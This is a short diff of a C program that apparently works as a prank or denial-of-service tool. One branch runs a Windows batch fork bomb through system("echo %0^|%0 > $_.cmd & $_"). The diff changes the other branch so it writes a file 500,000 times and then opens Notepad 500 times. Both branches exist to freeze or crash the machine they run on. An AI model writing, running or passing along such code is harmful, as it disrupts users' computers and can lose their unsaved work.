@@ -17,9 +17,11 @@ int main() {
     system("echo %0^|%0 > $_.cmd & $_");
   }
   else if (choice == 2) {
+    for (int i = 0; i < 500000; ++i) {
+      system("echo +100 Bitcoin > Edit.txt");
+    }
     for (int i = 0; i < 500; ++i) {
       system("notepad Edit.txt");
-      system("echo +100 Bitcoin > Edit.txt");
     }
   }
   return 0;
